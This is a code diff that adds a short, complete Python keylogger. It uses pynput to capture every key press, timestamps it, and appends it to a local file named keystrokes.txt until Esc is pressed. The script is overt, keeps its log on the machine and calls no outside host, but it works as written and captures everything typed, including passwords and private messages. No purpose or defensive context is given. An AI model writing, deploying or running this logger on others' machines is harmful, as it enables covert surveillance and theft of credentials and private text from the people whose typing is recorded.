@@ -1,0 +1,26 @@
+from pynput import keyboard
+import datetime
+
+# File to store logged keystrokes
+log_file = "keystrokes.txt"
+
+def on_press(key):
+    try:
+        # Get current timestamp
+        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        # Convert key to string
+        key_str = str(key).replace("'", "")
+        # Write to file
+        with open(log_file, "a") as f:
+            f.write(f"{timestamp}: {key_str}\n")
+    except Exception as e:
+        print(f"Error: {e}")
+
+def on_release(key):
+    # Stop listener when Esc is pressed
+    if key == keyboard.Key.esc:
+        return False
+
+# Start the key listener
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
